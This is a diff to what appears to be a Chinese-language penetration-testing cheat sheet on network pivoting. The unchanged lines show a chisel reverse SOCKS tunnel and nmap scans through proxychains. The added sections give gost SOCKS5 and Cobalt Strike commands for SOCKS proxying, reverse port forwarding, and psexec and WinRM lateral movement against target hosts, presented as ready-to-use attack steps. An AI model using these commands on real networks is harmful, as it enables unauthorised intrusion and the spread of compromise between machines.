@@ -164,3 +164,30 @@ chisel client 10.0.0.1:8080 R:1080:socks
 proxychains nmap -sT target_ip
 proxychains4 nmap -sT target_ip
 ```
+
+---
+
+## 11. Gost SOCKS 代理
+
+```bash
+gost -L socks5://username:password@:1080
+```
+
+---
+
+## 12. Cobalt Strike 代理
+
+```bash
+# 启动 SOCKS 代理
+socks 1080
+
+# 端口转发
+rportfwd 8080 target_ip 80
+
+# CS 内置 psexec 横向
+psexec target_ip share_name
+psexec_psh target_ip share_name
+
+# WinRM 横向
+winrm target_ip
+```
